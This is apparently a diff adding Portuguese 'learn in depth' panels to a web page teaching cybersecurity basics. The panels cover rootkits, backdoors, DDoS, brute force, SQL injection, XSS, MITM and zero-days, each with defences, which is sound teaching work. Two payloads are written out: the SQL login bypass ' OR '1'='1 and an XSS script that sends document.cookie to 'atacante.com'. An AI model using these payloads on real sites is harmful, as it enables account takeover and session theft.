+          <p>O nome vem de <em>root</em> (o superusuário/admin no Linux) + <em>kit</em> (conjunto de ferramentas). Um <b>rootkit</b> é um malware projetado para conseguir o <b>controle mais profundo possível</b> do sistema e, principalmente, para <b>se esconder</b> — dele mesmo, de outros malwares e das ferramentas de segurança. Ele se infiltra em camadas tão baixas (núcleo do sistema operacional, drivers, até o firmware/BIOS) que o próprio sistema "mente" para o antivírus sobre o que existe ali.</p>
+
+          <h4>Por que é tão difícil de detectar</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 520 220" role="img" aria-label="Camadas onde um rootkit se esconde">
+              <g font-family="Inter, sans-serif" font-size="12.5" fill="#eef6ff" text-anchor="middle">
+                <rect x="120" y="8" width="280" height="34" rx="8" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/><text x="260" y="30">🖥️ Seus programas (antivírus aqui)</text>
+                <rect x="90" y="52" width="340" height="34" rx="8" fill="rgba(116,255,0,.08)" stroke="#74ff00"/><text x="260" y="74">📂 Sistema operacional (o que você vê)</text>
+                <rect x="60" y="96" width="400" height="34" rx="8" fill="rgba(255,214,10,.10)" stroke="#ffd60a"/><text x="260" y="118">⚙️ Núcleo (kernel) — 👹 rootkit aqui</text>
+                <rect x="30" y="140" width="460" height="34" rx="8" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/><text x="260" y="162">🔌 Drivers / Firmware — 👹 rootkit mais fundo ainda</text>
+                <text x="260" y="200" font-size="11" fill="#9fb5c8">Quanto mais fundo o rootkit, menos o antivírus lá em cima consegue enxergar.</text>
+              </g>
+            </svg>
+            <figcaption>O antivírus pergunta ao sistema "tem algo malicioso?" — mas o rootkit controla quem responde, e responde "não".</figcaption>
+          </figure>
+
+          <div class="callout danger"><b>Caso real — Sony BMG (2005):</b> CDs de música instalavam um rootkit no PC do cliente para impedir cópias. Ele escondia arquivos de forma tão agressiva que <em>abriu brechas</em> para outros malwares se esconderem também. Virou um escândalo mundial de segurança.</div>
+
+          <h4>Como se proteger / detectar</h4>
+          <ul class="bullets">
+            <li>Habilite <b>Secure Boot</b> e proteções de integridade do sistema.</li>
+            <li>Ferramentas dedicadas de <b>anti-rootkit</b> e varredura offline (fora do SO infectado).</li>
+            <li>Em infecção confirmada, a recomendação séria é <b>reinstalar do zero</b> — não dá para confiar no sistema comprometido.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -612,6 +1048,16 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> "Porta dos fundos" deixada para retornar ao sistema.</div>
       <div class="line"><b>Por que aprender:</b> Persistência é tão importante quanto invasão.</div>
       <a href="https://www.malwarebytes.com/backdoor" target="_blank">Malwarebytes — Backdoor ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p>Um <b>backdoor</b> ("porta dos fundos") é um acesso secreto deixado num sistema para <b>voltar a entrar quando quiser</b>, contornando a autenticação normal. Depois de invadir uma vez (que é trabalhoso), o atacante instala um backdoor para garantir o retorno fácil — isso se chama <b>persistência</b>. Pode ser uma conta oculta, um serviço malicioso ou um trojan instalado.</p>
+          <div class="callout danger"><b>Atenção:</b> nem todo backdoor é de hacker. Já houve casos de backdoors inseridos em <em>software legítimo</em> (ataques de cadeia de suprimentos, como o caso SolarWinds em 2020) — comprometendo milhares de empresas de uma vez via uma atualização confiável.</div>
+          <p>Por isso, em resposta a incidentes, não basta "tirar o malware": é preciso caçar contas, tarefas agendadas e serviços estranhos que o atacante possa ter deixado para trás.</p>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -619,6 +1065,45 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Sobrecarga distribuída de requisições para derrubar um serviço.</div>
       <div class="line"><b>Por que aprender:</b> Botnets fazem isso por aluguel — barato e devastador.</div>
       <a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/" target="_blank">Cloudflare — DDoS ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>DDoS</b> = <em>Distributed Denial of Service</em> (Negação de Serviço Distribuída). A ideia é simples: sobrecarregar um site/servidor com um <b>volume gigantesco de requisições falsas</b>, vindas de milhares de máquinas ao mesmo tempo, até ele ficar lento ou cair — deixando os usuários reais sem acesso. Pense numa loja onde 10 mil pessoas falsas entram só para bloquear a porta: nenhum cliente verdadeiro consegue passar.</p>
+
+          <h4>Como funciona na prática</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 560 230" role="img" aria-label="Como um ataque DDoS usa uma botnet">
+              <defs><marker id="arrDdos" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff2e88"/></marker></defs>
+              <g font-family="Inter, sans-serif" font-size="11.5" fill="#eef6ff" text-anchor="middle">
+                <rect x="10" y="95" width="110" height="44" rx="9" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/><text x="65" y="121">👤 Atacante</text>
+                <rect x="180" y="14" width="120" height="34" rx="8" fill="rgba(162,89,255,.12)" stroke="#a259ff"/><text x="240" y="36">🧟 Zumbi</text>
+                <rect x="180" y="70" width="120" height="34" rx="8" fill="rgba(162,89,255,.12)" stroke="#a259ff"/><text x="240" y="92">🧟 Zumbi</text>
+                <rect x="180" y="126" width="120" height="34" rx="8" fill="rgba(162,89,255,.12)" stroke="#a259ff"/><text x="240" y="148">🧟 Zumbi</text>
+                <rect x="180" y="182" width="120" height="34" rx="8" fill="rgba(162,89,255,.12)" stroke="#a259ff"/><text x="240" y="204">🧟 +milhares</text>
+                <rect x="410" y="86" width="140" height="60" rx="10" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/><text x="480" y="112">🖥️ Servidor</text><text x="480" y="131" font-size="10" fill="#9fb5c8">sobrecarregado</text>
+                <g stroke="#a259ff" stroke-width="1.6" marker-end="url(#arrDdos)">
+                  <line x1="120" y1="110" x2="178" y2="31"/><line x1="120" y1="113" x2="178" y2="87"/><line x1="120" y1="119" x2="178" y2="143"/><line x1="120" y1="125" x2="178" y2="199"/>
+                </g>
+                <g stroke="#ff2e88" stroke-width="1.8" marker-end="url(#arrDdos)">
+                  <line x1="300" y1="31" x2="408" y2="100"/><line x1="300" y1="87" x2="408" y2="110"/><line x1="300" y1="143" x2="408" y2="122"/><line x1="300" y1="199" x2="408" y2="132"/>
+                </g>
+              </g>
+            </svg>
+            <figcaption>O atacante comanda uma <b>botnet</b> (rede de máquinas zumbi infectadas) para inundar o alvo. <b>DoS</b> é o mesmo ataque vindo de UMA única origem.</figcaption>
+          </figure>
+
+          <div class="callout danger"><b>Caso real — Dyn (2016):</b> a botnet <em>Mirai</em>, formada por câmeras e roteadores domésticos mal protegidos, derrubou serviços como Twitter, Netflix e Spotify em boa parte dos EUA. IoT barata virou uma arma gigante.</div>
+
+          <h4>Como se defende</h4>
+          <ul class="bullets">
+            <li>Serviços de <b>mitigação DDoS</b> (Cloudflare, AWS Shield) que absorvem o tráfego.</li>
+            <li><b>Rate limiting</b> e filtragem de tráfego anômalo.</li>
+            <li>Você ajuda a defender a internet mantendo seus dispositivos IoT <b>com senha forte</b> — para não virarem zumbis.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -633,6 +1118,34 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Tenta todas as combinações de senha possíveis.</div>
       <div class="line"><b>Por que aprender:</b> Mostra por que MFA é essencial.</div>
       <a href="https://owasp.org/www-community/attacks/Brute_force_attack" target="_blank">OWASP — Brute Force ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Brute force</b> ("força bruta") é o ataque que <b>tenta senha após senha</b> até acertar — testando combinações automaticamente, milhões por segundo. Não há "esperteza": é tentativa e erro em alta velocidade. Variações comuns: <b>dictionary attack</b> (testa uma lista de senhas comuns como <code>123456</code>, <code>senha</code>), <b>credential stuffing</b> (usa senhas vazadas de outros sites) e <b>password spraying</b> (testa uma senha comum em muitas contas).</p>
+
+          <h4>Por que o tamanho da senha importa TANTO</h4>
+          <p>Cada caractere a mais multiplica o número de combinações. Por isso uma senha longa é exponencialmente mais difícil de quebrar:</p>
+          <table class="cmp">
+            <tr><th>Senha</th><th>Tempo estimado para quebrar*</th></tr>
+            <tr><td><code>12345</code> (5 dígitos)</td><td>instantâneo</td></tr>
+            <tr><td><code>senha123</code> (8, só letras+nº)</td><td>minutos a horas</td></tr>
+            <tr><td><code>Tr0vão#2026</code> (11, variada)</td><td>centenas de anos</td></tr>
+            <tr><td>frase de 4 palavras aleatórias</td><td>milhões de anos</td></tr>
+          </table>
+          <p style="font-size:12px;color:var(--muted)">*Estimativas ilustrativas — variam com o hardware e o método de armazenamento da senha.</p>
+
+          <div class="callout tip"><b>Por que MFA mata esse ataque:</b> mesmo que o atacante acerte a senha por força bruta, ele trava no <b>segundo fator</b> (código do app, biometria, chave física) que ele não tem. Por isso 2FA/MFA é a defesa nº 1.</div>
+
+          <h4>Como se defender</h4>
+          <ul class="bullets">
+            <li>Senhas <b>longas e únicas</b> por site (use gerenciador de senhas).</li>
+            <li><b>2FA</b> sempre que possível.</li>
+            <li>Do lado do servidor: <b>limite de tentativas</b>, bloqueio temporário e CAPTCHA.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -640,6 +1153,38 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Injeção de comandos SQL via campos de aplicação.</div>
       <div class="line"><b>Por que aprender:</b> Top 3 do OWASP há 20 anos seguidos.</div>
       <a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger — SQLi ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>SQL Injection (SQLi)</b> acontece quando um site monta consultas ao banco de dados <b>misturando o comando com o que o usuário digita</b>, sem separar as coisas. Se o campo "usuário" entra direto na consulta, o atacante pode digitar <em>código SQL</em> em vez de um nome — e o banco obedece. Isso permite burlar logins, ler dados de outros usuários ou até apagar tabelas inteiras.</p>
+
+          <h4>Veja o problema com seus próprios olhos</h4>
+          <p>Imagine que o login do site monta esta consulta com o que você digita:</p>
+          <figure class="deep-fig">
+            <div class="mock mock-term">
+              <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span class="ttl">consulta gerada pelo site</span></div>
+              <pre><span class="m"># Uso normal — usuário digita "joao":</span>
+SELECT * FROM users WHERE user='<span class="g">joao</span>' AND pass='<span class="g">1234</span>';
+
+<span class="m"># Ataque — no campo senha o atacante digita:  ' OR '1'='1</span>
+SELECT * FROM users WHERE user='joao' AND pass='<span class="p">' OR '1'='1</span>';
+<span class="y"># '1'='1' é SEMPRE verdadeiro → login liberado sem saber a senha!</span></pre>
+            </div>
+            <figcaption>A aspa fecha o texto esperado e o <code>OR '1'='1'</code> torna a condição sempre verdadeira. O banco devolve o usuário e o site autentica.</figcaption>
+          </figure>
+
+          <div class="callout danger"><b>O quão grave é:</b> com SQLi dá para extrair <em>todo</em> o banco — e-mails, senhas (hashes), cartões. Vazamentos históricos enormes começaram com uma única injeção de SQL.</div>
+
+          <h4>Como se defende (a forma correta)</h4>
+          <ul class="bullets">
+            <li><b>Prepared statements / queries parametrizadas:</b> o dado nunca é tratado como comando. É a defesa definitiva.</li>
+            <li>Validação de entrada e princípio do <b>menor privilégio</b> no banco.</li>
+            <li>Um <b>WAF</b> ajuda a barrar tentativas conhecidas (camada extra, não substitui o código correto).</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -647,6 +1192,43 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Cross-Site Scripting — injeta JavaScript em páginas vistas por outros.</div>
       <div class="line"><b>Por que aprender:</b> Roubar cookies de sessão = roubar contas inteiras.</div>
       <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP — XSS ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>XSS</b> = <em>Cross-Site Scripting</em>. Enquanto o SQLi ataca o <b>banco de dados</b>, o XSS ataca <b>outros usuários</b>. Se um site exibe na página algo que o usuário digitou (um comentário, nome, busca) <b>sem tratar</b>, o atacante pode inserir <code>&lt;script&gt;</code> em vez de texto. Quando outra vítima abre a página, esse script roda <b>no navegador dela</b>, com a sessão dela.</p>
+
+          <h4>O que o atacante consegue fazer</h4>
+          <ul class="bullets">
+            <li><b>Roubar o cookie de sessão</b> → entrar na conta da vítima sem senha.</li>
+            <li>Registrar tudo que ela digita (keylogger via JavaScript).</li>
+            <li>Redirecionar para sites de phishing ou aplicar golpes na cara dela.</li>
+          </ul>
+
+          <h4>Exemplo: um comentário malicioso</h4>
+          <figure class="deep-fig">
+            <div class="mock mock-term">
+              <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span class="ttl">campo de comentário</span></div>
+              <pre><span class="m"># Em vez de um comentário, o atacante escreve:</span>
+<span class="p">&lt;script&gt;</span> fetch('http://atacante.com/?c='+document.cookie) <span class="p">&lt;/script&gt;</span>
+
+<span class="y"># O site salva e exibe. Quem abrir a página envia o
+# próprio cookie de sessão para o servidor do atacante.</span></pre>
+            </div>
+          </figure>
+
+          <h4>Os 3 tipos</h4>
+          <table class="cmp">
+            <tr><th>Tipo</th><th>Como funciona</th></tr>
+            <tr><td><b>Stored</b></td><td>Script fica salvo no site (comentário, perfil) e atinge todos os visitantes.</td></tr>
+            <tr><td><b>Reflected</b></td><td>Script vai num link malicioso; atinge quem clica.</td></tr>
+            <tr><td><b>DOM-based</b></td><td>O próprio JavaScript do site insere o dado perigoso na página.</td></tr>
+          </table>
+
+          <div class="callout tip"><b>Como se defende:</b> <em>escapar/sanitizar</em> toda saída (transformar <code>&lt;</code> em <code>&amp;lt;</code>), usar <b>Content Security Policy (CSP)</b> e marcar cookies de sessão como <code>HttpOnly</code> (o JavaScript não consegue lê-los).</div>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -661,6 +1243,38 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Atacante intercepta comunicação entre duas partes.</div>
       <div class="line"><b>Por que aprender:</b> Wi-Fi público sem VPN = isso pode estar rolando agora.</div>
       <a href="https://www.cloudflare.com/learning/security/threats/man-in-the-middle-attack/" target="_blank">Cloudflare — MITM ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Man-in-the-Middle (MITM)</b> = "homem no meio". O atacante se posiciona <b>secretamente entre você e o servidor</b> com quem você acha que está falando. Tudo que você envia passa por ele primeiro — ele pode <b>ler, gravar e até alterar</b> as mensagens antes de repassá-las. As duas pontas continuam achando que falam direto uma com a outra.</p>
+
+          <h4>Como funciona na prática</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 560 170" role="img" aria-label="Ataque man-in-the-middle">
+              <defs><marker id="arrMitm" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ffd60a"/></marker></defs>
+              <g font-family="Inter, sans-serif" font-size="12" fill="#eef6ff" text-anchor="middle">
+                <rect x="10" y="60" width="120" height="52" rx="10" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/><text x="70" y="82">🙂 Você</text><text x="70" y="100" font-size="10" fill="#9fb5c8">acha que fala c/ banco</text>
+                <rect x="218" y="14" width="124" height="48" rx="10" fill="rgba(255,46,136,.14)" stroke="#ff2e88"/><text x="280" y="35">🕵️ Atacante</text><text x="280" y="52" font-size="10" fill="#9fb5c8">lê tudo no meio</text>
+                <rect x="430" y="60" width="120" height="52" rx="10" fill="rgba(116,255,0,.08)" stroke="#74ff00"/><text x="490" y="82">🏦 Banco</text><text x="490" y="100" font-size="10" fill="#9fb5c8">servidor real</text>
+                <g stroke="#ffd60a" stroke-width="2" marker-end="url(#arrMitm)" fill="none">
+                  <path d="M130,80 Q200,40 218,40"/><path d="M342,40 Q420,40 430,78"/>
+                </g>
+                <text x="280" y="150" font-size="11" fill="#9fb5c8">Os dados desviam pelo atacante — ninguém percebe.</text>
+              </g>
+            </svg>
+            <figcaption>Clássico em <b>Wi-Fi público</b>: o atacante cria uma rede falsa ("Free WiFi") ou intercepta a legítima e fica no meio do caminho.</figcaption>
+          </figure>
+
+          <h4>Como se defender</h4>
+          <ul class="bullets">
+            <li>Só confie em <b>HTTPS</b> (cadeado) — ele criptografa de ponta a ponta. Nunca ignore avisos de "certificado inválido".</li>
+            <li>Em Wi-Fi público, use <b>VPN</b> — o atacante só vê tráfego embaralhado.</li>
+            <li>Evite redes abertas para banco/compras; desconfie de redes com nomes genéricos.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -731,6 +1345,23 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Vulnerabilidade descoberta antes que o fabricante saiba.</div>
       <div class="line"><b>Por que aprender:</b> Valem milhões no mercado negro e em bug bounty.</div>
       <a href="https://www.zerodayinitiative.com/" target="_blank">Zero Day Initiative ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Zero-day</b> ("dia zero") é uma vulnerabilidade <b>desconhecida do fabricante</b> — ou seja, não existe correção (patch) disponível. O nome vem disso: a empresa teve <b>"zero dias"</b> para consertar antes de o problema ser explorado. Enquanto ninguém sabe da falha, qualquer ataque que a use (<em>zero-day exploit</em>) é quase impossível de bloquear, porque não há assinatura nem patch.</p>
+          <h4>A linha do tempo de uma vulnerabilidade</h4>
+          <ol class="steps">
+            <li><b>Falha existe</b> no software, sem ninguém saber.</li>
+            <li>Alguém <b>descobre</b>. Se for um criminoso → exploit secreto (perigo máximo). Se for um pesquisador ético → reporta.</li>
+            <li>O fabricante é avisado e desenvolve o <b>patch</b>.</li>
+            <li>Patch lançado → a falha deixa de ser "zero-day" e vira um <b>CVE</b> conhecido.</li>
+            <li>Quem <b>não atualiza</b> continua vulnerável (a maioria dos ataques!).</li>
+          </ol>
+          <div class="callout danger"><b>Quanto vale:</b> um zero-day funcional para iPhone ou Android pode ser vendido por <b>milhões de dólares</b> a governos e brokers. É o item mais valioso do mercado ofensivo.</div>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
